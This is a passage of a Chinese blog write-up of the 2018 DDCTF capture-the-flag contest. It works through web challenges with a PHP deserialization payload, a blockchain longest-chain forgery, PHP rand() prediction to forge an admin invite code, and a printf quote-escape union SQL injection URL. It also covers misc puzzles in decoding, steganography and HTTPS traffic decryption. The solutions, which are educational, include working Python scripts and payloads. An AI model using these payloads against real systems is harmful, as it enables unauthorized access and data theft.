<p>此时我们发现他的析构函数中，有一条特殊的句子。跟进去之后发现，他会将falg打印出来。</p>
<p>仔细分析源码后发现，这个test类通过调用Flag类来获取flag，然而Flag类又需要调用SQL类来进行数据库查询。</p>
<p>所以，这个反序列化是个相当大的工程。自己手写是无望了。</p>
<p>首先尝试了一下，自己写三个类的调用。。。然而失败了。</p>
<p>最后复现源码，并在try方法打印序列化对象后。（uuid是你的url那串，uuid类下正则可以看出来。）</p>
<p><img src="https://img.5am3.com/img/180416/H3dE1bEeC8.png" alt="mark"></p>
<p>发现，他是有一个<strong>命名空间的要求</strong>。序列化后语句如下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:17:&quot;Index\Helper\Test&quot;:2:&#123;s:9:&quot;user_uuid&quot;;s:36:&quot;4eaee5db-2304-4d6d-aa9c-962051d99a41&quot;;s:2:&quot;fl&quot;;O:17:&quot;Index\Helper\Flag&quot;:1:&#123;s:3:&quot;sql&quot;;O:16:&quot;Index\Helper\SQL&quot;:2:&#123;s:3:&quot;dbc&quot;;N;s:3:&quot;pdo&quot;;N;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure>



<p>最终的Payload如下：</p>
<blockquote>
<p>url:<a href="http://116.85.48.105:5033/4eaee5db-2304-4d6d-aa9c-962051d99a41/justtry/try/">http://116.85.48.105:5033/4eaee5db-2304-4d6d-aa9c-962051d99a41/justtry/try/</a></p>
<p>postdata:</p>
<p>serialize&#x3D;%4f%3a%31%37%3a%22%49%6e%64%65%78%5c%48%65%6c%70%65%72%5c%54%65%73%74%22%3a%32%3a%7b%73%3a%39%3a%22%75%73%65%72%5f%75%75%69%64%22%3b%73%3a%33%36%3a%22%34%65%61%65%65%35%64%62%2d%32%33%30%34%2d%34%64%36%64%2d%61%61%39%63%2d%39%36%32%30%35%31%64%39%39%61%34%31%22%3b%73%3a%32%3a%22%66%6c%22%3b%4f%3a%31%37%3a%22%49%6e%64%65%78%5c%48%65%6c%70%65%72%5c%46%6c%61%67%22%3a%31%3a%7b%73%3a%33%3a%22%73%71%6c%22%3b%4f%3a%31%36%3a%22%49%6e%64%65%78%5c%48%65%6c%70%65%72%5c%53%51%4c%22%3a%32%3a%7b%73%3a%33%3a%22%64%62%63%22%3b%4e%3b%73%3a%33%3a%22%70%64%6f%22%3b%4e%3b%7d%7d%7d</p>
</blockquote>
<h3 id="web4-mini-blockchain-280pt"><a href="#web4-mini-blockchain-280pt" class="headerlink" title="web4 mini blockchain  (280pt)"></a>web4 mini blockchain  (280pt)</h3><blockquote>
<p>某银行利用区块链技术，发明了DiDiCoins记账系统。某宝石商店采用了这一方式来完成钻石的销售与清算过程。不幸的是，该银行被黑客入侵，私钥被窃取，维持区块链正常运转的矿机也全部宕机。现在，你能追回所有DDCoins，并且从商店购买2颗钻石么？</p>
<p><code>注意事项：区块链是存在cookie里的，可能会因为区块链太长，浏览器不接受服务器返回的set-cookie字段而导致区块链无法更新，因此强烈推荐写脚本发请求</code></p>
<p>题目入口：<br><a href="http://116.85.48.107:5000/b942f830cf97e">http://116.85.48.107:5000/b942f830cf97e</a></p>
</blockquote>
<p>拿到题目，内心是拒绝的。因为虽然说区块链这么火，但是自己还是没怎么了解过。</p>
<p>第一反应是。药丸，没戏了。但是，搞信息安全的孩子怎么可以轻言放弃呢！</p>
<p>时间辣么长，还不信看不明白个区块链。最后肛了两天多，才大概明白了题目</p>
<p>首先，题目给了源码，这个很棒棒。</p>
<p>建议大家分析题目时将代码也多读几遍，然后再结合参考资料进行理解。</p>
<p>在这里不做太多的理解源码的讲解。</p>
<p>最初我是将重心代码的一些逻辑上，以及加密是否可逆。（发现自己太年轻，看不懂）</p>
<p>然后慢慢的开始了解区块链，最后发现这种手段。</p>
<p>这道题目中，利用了区块链一个很神奇的东西。</p>
<p>因为区块链是一个链表，而且还是一个谁都可以增加的，此时，人们达成了一种默认，以最长的那条链为主链（正版），其他的分支都是盗版。</p>
<p>如下图，就是此时该题目的区块链。</p>
<p><img src="https://img.5am3.com/img/180420/fbLcGAFJ4a.png" alt="mark"></p>
<p>那么我们可以再构造一条链，只要比主链长，那这条链就是我们说了算。</p>
<p><img src="https://img.5am3.com/img/180420/EL389D98Lb.png" alt="mark"></p>
<p>此时虽然说区块链1是正规的链，但是区块链2要比1长，此时区块链2即为正规链。</p>
<p>但是，说的轻巧，我们该如何构造呢？</p>
<p>首先，我们分析路由可以发现，题目预留了一个创建交易的接口。此时可以生成新块。</p>
<p><img src="https://img.5am3.com/img/180420/CkLdA2d7gD.png" alt="mark"></p>
<p>只要我们可以挖到一个DDcoin，就可以创建一次新块，然后会判断商店的余额。最终给予砖石奖励。</p>
<p>然而DDcoin是什么呢。</p>
<p>在这道题里，其实就是这个东西，这就是一个区块。对他进行分析一下。</p>
<p><img src="https://img.5am3.com/img/180420/bAGKCC8KEk.png" alt="mark"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">nonce:自定义字符串</span><br><span class="line">prev：上一个区块的地址</span><br><span class="line">hash：这个区块的hash</span><br><span class="line">height：当前处于第几个节点</span><br><span class="line">transactions：交易信息</span><br></pre></td></tr></table></figure>

<p>再分析transactions</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">input与signature好像是一个凭证，验证这个区块主人身份。</span><br><span class="line">output，收款人信息</span><br><span class="line">amount，收款数额</span><br><span class="line">addr，收款地址</span><br></pre></td></tr></table></figure>

<p>hash这里的话，不是太明白。</p>
<p>但是看代码。发现都有现成的可以生成。只要利用这三个函数，即可创建一个新的区块。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">create_output_utxo(addr_to, amount) // 新建一个output信息</span><br><span class="line">create_tx(input_utxo_ids, output_utxo, privkey_from=None) // 新建一个transactions信息</span><br><span class="line">create_block(prev_block_hash, nonce_str, transactions) // 新建一个区块</span><br></pre></td></tr></table></figure>

<p>首先新建output，此时参数很简单，收货人地址（商店），数量（全款）</p>
<p>然后创建tx，此时output_utxo就是刚刚咱创建好的那个。然而问题来了，私钥和id咱是没有的。此时分析代码可以发现，这一步做的主要就是创建一个sig签名。还有就是生成一个hash</p>
<p><img src="https://img.5am3.com/img/180420/c1c4eeFhhi.png" alt="mark"></p>
<p>此时，邪恶的想到，既然是要创建第二条链，那么可不可以借用一下第一条链的第一块的信息。</p>
<p>也就是直接忽略掉sig的生成，伪造tx，直接重写一下create_tx</p>
<p><img src="https://img.5am3.com/img/180420/3iC0KHeBd4.png" alt="mark"></p>
<p>然后此时tx也有了，进行下一步create_block</p>
<p>此时他的三个参数也好写，上一个区块的hash，自定义字符串，刚刚做好的tx</p>
<p>此时，我们要通过爆破nonce的方式，来使create_block生成的块的hash为00000开头，</p>
<p>这样，我们才能添加。</p>
<p>然后向那个添加块的地址post由create_block即可成功添加第一个块。</p>
<p>记得改请求头中的content-type为json。还有就是cookie自己手动更新</p>
<p>第二个块的时候，问题又来了。</p>
<p>这条链中，我们之前的tx已经使用过一次，无法使用了。怎么办？</p>
<p>此时可以注意到题目中init中给的hint。</p>
<p><img src="https://img.5am3.com/img/180420/E8I6mh7ie9.png" alt="mark"></p>
<p>凭啥他可以不写tx就生成块！不开心，你都能那样，我也要！</p>
<p>于是。。。。。通过这个方式，在后面添加几个空区块就好。</p>
<p>成功伪造主链！获取一颗砖石。</p>
<p>再次重复以上做法，完成第三条链即可获取到flag</p>
<p>切记，手动更新cookie……</p>
<h3 id="web5-我的博客-320pt"><a href="#web5-我的博客-320pt" class="headerlink" title="web5 我的博客 (320pt)"></a>web5 我的博客 (320pt)</h3><blockquote>
<p>提示：<code>www.tar.gz</code></p>
<p><a href="http://116.85.39.110:5032/a8e794800ac5c088a73b6b9b38b38c8d">http://116.85.39.110:5032/a8e794800ac5c088a73b6b9b38b38c8d</a></p>
</blockquote>
<p>题目又给了源码，美滋滋。</p>
<p>然而下载到源码后就不美滋滋了。</p>
<p>一共给了三个页面，主页很明显，有一个SQL注入漏洞。这个题之前安恒杯三月见过。利用率printf函数的一个小漏洞，%1$’可以造成单引号逃逸。</p>
<p>然而，你是进不去主页的。因为。。</p>
<p><img src="https://img.5am3.com/img/180420/e5eCF99g1b.png" alt="mark"></p>
<p>还没进去，就被die了。</p>
<p>然后只好分析如何能成为admin了。此时看到了。</p>
<p><img src="https://img.5am3.com/img/180420/4eiEJejmeJ.png" alt="mark"></p>
<p>当你是通过邀请码注册的，你便可以成为admin。</p>
<p>然而，邀请码是完全随机的。</p>
<p>此时，想起LCTF的一道题，感觉完全一样有木有！</p>
<p><a href="https://github.com/LCTF/LCTF2017/tree/master/src/web/%E8%90%8C%E8%90%8C%E5%93%92%E7%9A%84%E6%8A%A5%E5%90%8D%E7%B3%BB%E7%BB%9F">https://github.com/LCTF/LCTF2017/tree/master/src/web/%E8%90%8C%E8%90%8C%E5%93%92%E7%9A%84%E6%8A%A5%E5%90%8D%E7%B3%BB%E7%BB%9F</a></p>
<p>然而当时有两个解，一个非预期条件竞争，另一个正则的漏洞。</p>
<p>此时这题完全没用啊！当时要疯了，猜测，难道是要预测随机数？</p>
<p><img src="https://img.5am3.com/img/180420/HlF2LhKjaE.png" alt="mark"></p>
<p>然而，当我看到大佬这句话的时候，萌生了放弃的想法，猜测肯定还有其他解法。</p>
<p>奈何，看啊看，看啊看，我瞪电脑，电脑瞪我。</p>
<p>最后还是决定看一下随机数这里。很开心，找到了这篇文章。</p>
<p><a href="http://drops.xmd5.com/static/drops/web-11861.html">http://drops.xmd5.com/static/drops/web-11861.html</a></p>
<p>然而，每个卵用，他只告诉了我：对！毛病就在随机数，但是你会么？</p>
<p>满满的都是嘲讽….</p>
<p>来吧，一起看，首先这篇文章讲了一种后门的隐藏方式，话说我读了好几遍才理解。</p>
<p>然后不得不感叹，作者….你还是人么。这都能想出来。服！真的服！</p>
<p>首先，大家需要先知道rand()是不安全的随机数。（然而我不知道）</p>
<p>然后str_shuffle()是调用rand()实现的随机。所以此时重点是。如何预测rand？</p>
<p>然而作者没告诉，给的链接都是数学，看不懂…..</p>
<p>此时PHITHON大佬的这篇文章真的是解救了自己。</p>
<p><a href="https://www.leavesongs.com/penetration/safeboxs-secret.html">https://www.leavesongs.com/penetration/safeboxs-secret.html</a></p>
<p><img src="https://img.5am3.com/img/180420/4EiBcAcJ4F.png" alt="mark"></p>
<p>所以，此时我们知道了一件事情。当我们可以获取到连续的33个随机数后，我们就可以预测后面连续的所有随机数。</p>
<p>如何连续？大佬文章中说了，通过http请求头中的Connection:Keep-Alive。</p>
<p>此时，我们先获取他100个随机数。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">s = requests.Session()</span><br><span class="line">url=<span class="string">&#x27;http://116.85.39.110:5032/a8e794800ac5c088a73b6b9b38b38c8d/register.php&#x27;</span></span><br><span class="line">headers=&#123;<span class="string">&#x27;Connection&#x27;</span>: <span class="string">&#x27;Keep-Alive&#x27;</span>&#125;</span><br><span class="line">state=[]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">50</span>):</span><br><span class="line">		r=s.get(url,headers=headers)</span><br><span class="line">		state.append(<span class="built_in">int</span>(re.search(<span class="string">r&#x27;id=&quot;csrf&quot; value=&quot;(.+?)&quot; required&gt;&#x27;</span>, r.text, re.M|re.I).group(<span class="number">1</span>)))</span><br></pre></td></tr></table></figure>

<p>然后测试一下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">yuce_list=[]</span><br><span class="line">for i in range(10):</span><br><span class="line">	yuceTemp=yuce(len(state))</span><br><span class="line">	state.append(yuceTemp)</span><br><span class="line">	yuce_list.append(yuceTemp)</span><br></pre></td></tr></table></figure>

<p>此时发现和实际是有一些冲突的。分析后发现，应该将生成的随机数取余2147483647才是真正的数。</p>
<p>但此时又有了一个问题。</p>
<p><img src="https://img.5am3.com/img/180420/IFf3H6L8I2.png" alt="mark"></p>
<p>之前大佬是说过会有一定的误差，但是误差率太高了。虽然误差不大，但是….</p>
<p>此时，没办法，只能祈求后面会处理误差。此时我们完成了随机数的预测。</p>
<p>接下来需要写如何打乱字符串。</p>
<p>可以发现，一个很简单的流程，生成随机数，然后交换位置。</p>
<p><img src="https://img.5am3.com/img/180420/JmcdCf9Lk8.png" alt="mark"></p>
<p>唯一不知道的地方就是其中这个地方的一个函数。</p>
<p>此时直接去GitHub翻一下源码。</p>
<p><a href="https://github.com/jinjiajin/php-5.6.9/blob/35e92f1f88b176d64f1d8fc983e466df383ee34e/ext/standard/php_rand.h">https://github.com/jinjiajin/php-5.6.9/blob/35e92f1f88b176d64f1d8fc983e466df383ee34e/ext/standard/php_rand.h</a></p>
<p><img src="https://img.5am3.com/img/180420/d3Dd8A1eg8.png" alt="mark"></p>
<p>然后就是愉快的重写代码。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">def rand_range(rand,minN,maxN,tmax=2147483647):</span><br><span class="line">	temp1=tmax+1.0</span><br><span class="line">	temp2=rand/temp1</span><br><span class="line">	temp3=maxN-minN</span><br><span class="line">	temp4=temp3+1.0</span><br><span class="line">	temp5=temp4*temp2</span><br><span class="line">	rand=minN+(int)(temp5)</span><br><span class="line">	return rand</span><br><span class="line">admin_old=[&#x27;0&#x27;,&#x27;1&#x27;,&#x27;2&#x27;,&#x27;3&#x27;,&#x27;4&#x27;,&#x27;5&#x27;,&#x27;6&#x27;,&#x27;7&#x27;,&#x27;8&#x27;,&#x27;9&#x27;,&#x27;a&#x27;,&#x27;b&#x27;,&#x27;c&#x27;,&#x27;d&#x27;,&#x27;e&#x27;,&#x27;f&#x27;,&#x27;g&#x27;,&#x27;h&#x27;,&#x27;i&#x27;,&#x27;j&#x27;,&#x27;k&#x27;,&#x27;l&#x27;,&#x27;m&#x27;,&#x27;n&#x27;,&#x27;o&#x27;,&#x27;p&#x27;,&#x27;q&#x27;,&#x27;r&#x27;,&#x27;s&#x27;,&#x27;t&#x27;,&#x27;u&#x27;,&#x27;v&#x27;,&#x27;w&#x27;,&#x27;x&#x27;,&#x27;y&#x27;,&#x27;z&#x27;,&#x27;A&#x27;,&#x27;B&#x27;,&#x27;C&#x27;,&#x27;D&#x27;,&#x27;E&#x27;,&#x27;F&#x27;,&#x27;G&#x27;,&#x27;H&#x27;,&#x27;I&#x27;,&#x27;J&#x27;,&#x27;K&#x27;,&#x27;L&#x27;,&#x27;M&#x27;,&#x27;N&#x27;,&#x27;O&#x27;,&#x27;P&#x27;,&#x27;Q&#x27;,&#x27;R&#x27;,&#x27;S&#x27;,&#x27;T&#x27;,&#x27;U&#x27;,&#x27;V&#x27;,&#x27;W&#x27;,&#x27;X&#x27;,&#x27;Y&#x27;,&#x27;Z&#x27;]</span><br><span class="line"></span><br><span class="line">for i in range(len(admin_old))[::-1]:</span><br><span class="line">	a=rand_range(int(yuce_list[len(admin_old)-i-1]),0,i)</span><br><span class="line">	admin_old[i],admin_old[a]=admin_old[a],admin_old[i]</span><br><span class="line">key=&#x27;&#x27;</span><br><span class="line">for i in admin_old:</span><br><span class="line">	key+=i</span><br><span class="line">print(key)</span><br></pre></td></tr></table></figure>

<p>此时就可以愉快的生成随机数了。然后在进行一下注册。此时csrf记得提前在获取state时保存一下最后一位。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">def getAdmin(username,passwd,code):</span><br><span class="line">	data=&#123;</span><br><span class="line">		&quot;csrf&quot;:csrf,</span><br><span class="line">		&quot;username&quot;:username,</span><br><span class="line">		&quot;password&quot;:passwd,</span><br><span class="line">		&quot;code&quot;:code</span><br><span class="line">	&#125;</span><br><span class="line">	r=s.post(url,headers=headers,data=data)</span><br><span class="line">	print(r.text)</span><br></pre></td></tr></table></figure>



<p>切记！code是：admin###开头，后面截取32位！</p>
<p>最后用拿到的账号进行登录即可。</p>
<p>后面就是sql注入了。很简单，只要单引号逃逸后，就可以显注了。没有其他过滤</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/a8e794800ac5c088a73b6b9b38b38c8d/index.php?id=1&amp;title=-1%1$&#x27;+union+select+1,f14g,3+from+a8e79480.key+where+1+%23 </span><br></pre></td></tr></table></figure>



<p><img src="https://img.5am3.com/img/180420/4kH7ml65cG.png" alt="mark"></p>
<h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="misc1-签到题-1pt"><a href="#misc1-签到题-1pt" class="headerlink" title="misc1 签到题  (1pt)"></a>misc1 签到题  (1pt)</h3><blockquote>
<p>请点击按钮下载附件</p>
</blockquote>
<p>出题人是真的皮。下载后会发现一个神奇的东西。flag.txt里面的内容是这个</p>
<blockquote>
<p>请查看赛题上方“公告”页</p>
</blockquote>
<p>然后打开公告页，发现了他。。</p>
<blockquote>
<p>DDCTF{echo”W3Lc0me_2_DiD1${PAAMAYIM_NEKUDOTAYIM}C7f!”}</p>
</blockquote>
<p>好歹咱也是个web手。so …..</p>
<p>本来还以为要解开里面的PHP代码。自己误以为是这个。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DDCTF&#123;W3Lc0me_2_DiD1::C7f!&quot;&#125;</span><br></pre></td></tr></table></figure>

<p>最后发现，原来是真·签到题。</p>
<h3 id="misc2-╯°□°）╯︵-┻━┻-50pt"><a href="#misc2-╯°□°）╯︵-┻━┻-50pt" class="headerlink" title="misc2 (╯°□°）╯︵ ┻━┻  (50pt)"></a>misc2 (╯°□°）╯︵ ┻━┻  (50pt)</h3><blockquote>
<p>(╯°□°）╯︵ ┻━┻</p>
<p>d4e8e1f4a0f7e1f3a0e6e1f3f4a1a0d4e8e5a0e6ece1e7a0e9f3baa0c4c4c3d4c6fbb9b2b2e1e2b9b9b7b4e1b4b7e3e4b3b2b2e3e6b4b3e2b5b0b6b1b0e6e1e5e1b5fd</p>
</blockquote>
<p>这道题蛮坑的。。想了无数种密码后都没思路。最后只能老老实实研究，或许是一些简单的编码？</p>
<p>一共134个字符。尝试2位一组，转化为十进制后，发现数值在一定范围内浮动。</p>
<p><img src="https://img.5am3.com/img/180414/DJJgj7G8m9.png" alt="mark"></p>
<p>然后考虑到ascii码可见区域，于是尝试对其进行取余128的操作。</p>
<p>最后发现余数均在ascii码的可见区域。之后hex2ascii 即可获取到flag。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">a=[212,232,225,244,160,247,225,243,160,230,225,243,244,161,160,212,232,229,160,230,236,225,231,160,233,243,186,160,196,196,195,212,198,251,185,178,178,225,226,185,185,183,180,225,180,183,227,228,179,178,178,227,230,180,179,226,181,176,182,177,176,230,225,229,225,181,253]</span><br><span class="line">b=&#x27;&#x27;</span><br><span class="line">for i in a:</span><br><span class="line">	b+=chr(i%128)</span><br><span class="line">print(b)</span><br></pre></td></tr></table></figure>

<p><img src="https://img.5am3.com/img/180415/8EheaAIHLI.png" alt="mark"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DDCTF&#123;922ab9974a47cd322cf43b50610faea5&#125;</span><br></pre></td></tr></table></figure>



<h3 id="misc3-第四扩展FS-（100pt）"><a href="#misc3-第四扩展FS-（100pt）" class="headerlink" title="misc3 第四扩展FS （100pt）"></a>misc3 第四扩展FS （100pt）</h3><blockquote>
<p>D公司正在调查一起内部数据泄露事件，锁定嫌疑人小明，取证人员从小明手机中获取了一张图片引起了怀疑。这是一道送分题，提示已经在题目里，日常违规审计中频次有时候非常重要。</p>
</blockquote>
<p>拿到图片，发现大小出奇的大，于是尝试binwalk，提出来一个压缩包。</p>
<p><img src="https://img.5am3.com/img/180415/51k5a6LgEL.png" alt="mark"></p>
<p>尝试打开，发现是有密码的。（这里有个技巧，个人比较喜欢用windows的<strong>好压</strong>解压缩软件，这个软件存在一定的压缩包修复。）</p>
<p>然后回到题目，仔细分析。尝试无果后，最终将密码锁定在了<code>提示已经在题目里</code>，所以尝试查看文件属性，发现了一些奇怪的字符串。</p>
<p><img src="https://img.5am3.com/img/180415/e7idiEm4kD.png" alt="mark"></p>
<p>一般来说，图片信息中不会出现备注的。所以尝试将其作为密码解压，解压成功。</p>
<p>然后发现了一串稀奇古怪的。。。。字符。</p>
<p><img src="https://img.5am3.com/img/180415/IejD01mAdG.png" alt="mark"></p>
<p>此时想到了题目中给的hint：<code>日常违规审计中频次有时候非常重要</code></p>
<p>尝试词频统计。得到flag</p>
<p><img src="https://img.5am3.com/img/180415/c5Bbi3bc9i.png" alt="mark"></p>
<p>此时有一点小小坑。。D是两个。。</p>
<p>flag ：DDCTF{x1n9shaNgbIci}</p>
<h3 id="misc4-流量分析-200pt"><a href="#misc4-流量分析-200pt" class="headerlink" title="misc4 流量分析 (200pt)"></a>misc4 流量分析 (200pt)</h3><blockquote>
<p>提示一：若感觉在中间某个容易出错的步骤，若有需要检验是否正确时，可以比较MD5: 90c490781f9c320cd1ba671fcb112d1c<br>提示二：注意补齐私钥格式<br>—–BEGIN RSA PRIVATE KEY—–<br>XXXXXXX<br>—–END RSA PRIVATE KEY—–</p>
</blockquote>
<p>怎么说呢，做完这题，我才知道坑人能有多坑！</p>
<p>流量分析的题，首先可以发现他的大小很小。不像是那种大流量的分析。</p>
<p>尝试了一下学长之前推荐的一款工具《科来网络分析系统》</p>
<p><img src="https://img.5am3.com/img/180420/a5gJ6kKHdE.png" alt="mark"></p>
<p>可以发现ftp传输了两个包。此时，fl-g极有可能是flag。</p>
<p>于是拿wireshark千辛万苦，提取出来压缩包。然而….没有密码。</p>
<p>只好继续分析了。因为毕竟misc4了，不可能是密码爆破啥的吧。</p>
<p>继续看， 发现一个邮件（不知道科来怎么提文件，查看数据。哭唧唧）</p>
<p>wireshark导出IMF对象。可以发现导出了几个邮件。然后逐个分析。</p>
<p>然而并没卵用，唯一有点用的，感觉奇怪的，就只有一个邮件。</p>
<p><img src="https://img.5am3.com/img/180420/b5AFL2bKKH.png" alt="mark"></p>
<p>此时这个不是一点的奇怪！而是很奇怪！那么，这串密钥。。是干什么的呢。</p>
<p>经过老司机多年开车经验，呸。做题经验。</p>
<p>猜测！肯定有https流量。当然，科来也说有了。</p>
<p><img src="https://img.5am3.com/img/180420/K6H9B5H4d8.png" alt="mark"></p>
<p>于是。。这种之前曾听说过的题目，现在到了手里还是有些小激动的。</p>
<p>尤其是那个图片！图片！图片！！！！</p>
<p>ocr也不行，手写也不行。那么多字。心塞ing。</p>
<p>好吧，最后还是百度找了个ocr识别了一下，然后改了几个字符。。</p>
<p>然后就是解密https流量。具体可以看这个链接。</p>
<p><a href="https://blog.csdn.net/kelsel/article/details/52758192">https://blog.csdn.net/kelsel/article/details/52758192</a></p>
<p>直接导入私钥就可以。这里需要按照hint格式来，在前后加上标志位。</p>
<p>然后就可以解密https流量了。</p>
<p>然后搜索ssl，追踪http流量，最后取得flag</p>
<p><img src="https://img.5am3.com/img/180420/8dmC106gg8.png" alt="mark"></p>

      
    </div>
    
  </div>
  
    
    <div class="copyright">
        <p><span>本文标题:</span><a  href="/2018/04/24/ddctf2018/">2018DDCTF  writeup</a></p>
        <p><span>文章作者:</span><a  href="/" title="访问  的个人博客"></a></p>
        <p><span>发布时间:</span>2018年04月24日 - 15时38分</p>
        <p><span>最后更新:</span>2024年12月05日 - 02时39分</p>
        <p>
            <span>原始链接:</span><a class="post-url" href="/2018/04/24/ddctf2018/" title="2018DDCTF  writeup">https://blog.5am3.com/2018/04/24/ddctf2018/</a>
            <span class="copy-path" data-clipboard-text="原文: https://blog.5am3.com/2018/04/24/ddctf2018/　　作者: " title=""></span>
        </p>
        <p>
            <span>许可协议:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/3.0/cn/" title="中国大陆 (CC BY-NC-SA 3.0 CN)" target = "_blank">"署名-非商用-相同方式共享 3.0"</a> 转载请保留原文链接及作者。
        </p>
    </div>



<nav id="article-nav">
  
    <a  href="/2018/05/04/web-testing-one/" id="article-nav-newer" class="article-nav-link-wrap">
      <strong class="article-nav-caption"><</strong>
      <div class="article-nav-title">
        
          记一次简单的渗透测试
        
      </div>
    </a>
  
  
    <a  href="/2018/03/26/qwb-xss-rpo/" id="article-nav-older" class="article-nav-link-wrap">
      <div class="article-nav-title">强网杯-Share your mind</div>
      <strong class="article-nav-caption">></strong>
    </a>
  
</nav>


  
</article>

    <div id="toc" class="toc-article">
    <strong class="toc-title">文章目录</strong>
    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#WEB"><span class="toc-number">1.</span> <span class="toc-text">WEB</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#web1-%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84%E7%A7%98%E5%AF%86-100pt"><span class="toc-number">1.1.</span> <span class="toc-text">web1 数据库的秘密 (100pt)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web2-%E4%B8%93%E5%B1%9E%E9%93%BE%E6%8E%A5-200pt"><span class="toc-number">1.2.</span> <span class="toc-text">web2 专属链接 (200pt)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web3-%E6%B3%A8%E5%85%A5%E7%9A%84%E5%A5%A5%E5%A6%99-250pt"><span class="toc-number">1.3.</span> <span class="toc-text">web3 注入的奥妙 (250pt)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web4-mini-blockchain-280pt"><span class="toc-number">1.4.</span> <span class="toc-text">web4 mini blockchain  (280pt)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web5-%E6%88%91%E7%9A%84%E5%8D%9A%E5%AE%A2-320pt"><span class="toc-number">1.5.</span> <span class="toc-text">web5 我的博客 (320pt)</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#MISC"><span class="toc-number">2.</span> <span class="toc-text">MISC</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#misc1-%E7%AD%BE%E5%88%B0%E9%A2%98-1pt"><span class="toc-number">2.1.</span> <span class="toc-text">misc1 签到题  (1pt)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#misc2-%E2%95%AF%C2%B0%E2%96%A1%C2%B0%EF%BC%89%E2%95%AF%EF%B8%B5-%E2%94%BB%E2%94%81%E2%94%BB-50pt"><span class="toc-number">2.2.</span> <span class="toc-text">misc2 (╯°□°）╯︵ ┻━┻  (50pt)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#misc3-%E7%AC%AC%E5%9B%9B%E6%89%A9%E5%B1%95FS-%EF%BC%88100pt%EF%BC%89"><span class="toc-number">2.3.</span> <span class="toc-text">misc3 第四扩展FS （100pt）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#misc4-%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90-200pt"><span class="toc-number">2.4.</span> <span class="toc-text">misc4 流量分析 (200pt)</span></a></li></ol></li></ol>
</div>
<style>
    .left-col .switch-btn {
        display: none;
    }
    .left-col .switch-area {
        display: none;
    }
</style>
<input type="button" id="tocButton" value="隐藏目录"  title="点击按钮隐藏或者显示文章目录">

<script src="//cdn.bootcss.com/jquery/1.11.1/jquery.min.js"></script>

<script>
    var valueHide = "隐藏目录";
    var valueShow = "显示目录";
    if ($(".left-col").is(":hidden")) {
        $("#tocButton").attr("value", valueShow);
    }
    $("#tocButton").click(function() {
        if ($("#toc").is(":hidden")) {
            $("#tocButton").attr("value", valueHide);
            $("#toc").slideDown(320);
            $(".switch-btn, .switch-area").fadeOut(300);
        }
        else {
            $("#tocButton").attr("value", valueShow);
            $("#toc").slideUp(350);
            $(".switch-btn, .switch-area").fadeIn(500);
        }
    })
    if ($(".toc").length < 1) {
        $("#toc, #tocButton").hide();
        $(".switch-btn, .switch-area").show();
    }
</script>




<div class="bdsharebuttonbox">
	<a href="#" class="fx fa-weibo bds_tsina" data-cmd="tsina" title="分享到新浪微博"></a>
	<a href="#" class="fx fa-weixin bds_weixin" data-cmd="weixin" title="分享到微信"></a>
	<a href="#" class="fx fa-qq bds_sqq" data-cmd="sqq" title="分享到QQ好友"></a>
